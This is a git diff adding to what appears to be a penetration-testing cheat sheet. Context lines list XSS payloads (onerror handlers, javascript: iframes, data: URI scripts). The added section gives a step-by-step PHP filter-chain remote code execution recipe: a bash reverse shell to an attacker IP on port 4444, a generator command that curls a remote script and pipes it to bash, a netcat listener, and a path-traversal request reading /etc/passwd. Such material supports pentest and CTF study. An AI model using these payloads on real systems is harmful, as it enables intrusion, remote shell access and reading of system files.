@@ -144,3 +144,14 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
 - `<iframe src=javascript:alert(1337)>`
 - `<object data="data:text/html,<script>alert(1337)</script>"></object>`
 - `<script src=data:text/javascript,alert(1337)></script>`
+
+### PHP
+#### Filters Chaining
+- If you notice a parameter using PHP filters there's a chance it may be susceptible to RCE via filter chaining. Example URL `/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
+- https://github.com/synacktiv/php_filter_chain_generator tool could be used to exploit it as follows:
+  - First create a shell script named "revshell" on your local machine with the following contents, inserting your attacker machine IP address `bash -i >& /dev/tcp/x.x.x.x/4444 0>&1`
+  - Use the aforementioned tool to create a chain payload, inserting your attacker machine IP address ```python3 php_filter_chain_generator.py --chain '<?= `curl -s -L x.x.x.x/revshell|bash` ?>``` (`<?= ?>` is shorthand for `<?php echo ~ ?>`)
+  - Start a web server to host the revshell script and also start a netcat listener on the port specified in revshell
+  - Execute the payload by requesting the following URL (the above vulnerable parameter has been used as an example) `/secret-script.php?file=<generated_chain>`
+#### LFI
+- LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
